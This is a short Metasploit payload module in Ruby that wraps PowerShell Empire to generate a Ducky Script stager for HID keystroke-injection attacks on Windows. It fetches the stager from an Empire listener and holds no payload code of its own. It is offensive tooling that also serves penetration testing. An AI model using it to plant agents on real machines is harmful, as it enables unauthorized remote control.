##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
    'Description'=> 'Creates a Ducky Script to be used in HID exploitations for Empire'
    ))
  end

  def stagerGenerator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/ducky')
    return @stagerCode
  end
end
